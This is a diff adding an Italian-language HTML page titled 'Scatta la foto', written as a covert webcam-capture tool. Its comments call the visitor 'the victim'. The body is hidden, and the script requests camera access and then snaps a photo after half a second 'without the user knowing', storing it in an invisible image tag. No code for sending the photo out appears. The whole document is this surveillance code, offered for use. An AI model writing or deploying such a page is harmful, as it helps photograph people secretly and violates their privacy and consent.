@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Scatta la foto</title>
+</head>
+<body style="display:none;"> <!-- Nasconde tutto il contenuto alla vittima -->
+    <video id="video" width="320" height="240" autoplay></video>
+    <img id="foto" src="" alt="Immagine scattata" style="display:none;" /> <!-- L'immagine scattata è nascosta -->
+
+    <script>
+        const video = document.getElementById('video');
+        const foto = document.getElementById('foto');
+
+        // Richiesta accesso alla fotocamera
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                
+                // Scatta la foto dopo 0.5 secondi senza che l'utente lo sappia
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // La foto viene scattata e salvata, ma non viene mostrata
+                    foto.src = canvas.toDataURL('image/png');
+                    
+                    // La foto è memorizzata nel tag img, ma non è visibile per la vittima
+                }, 500); // Foto scattata dopo 0.5 secondi
+            })
+            .catch(error => {
+                console.error("Errore nell'accesso alla fotocamera: ", error);
+                alert("Non è stato possibile accedere alla fotocamera. Assicurati di consentire l'accesso.");
+            });
+    </script>
+</body>
+</html>
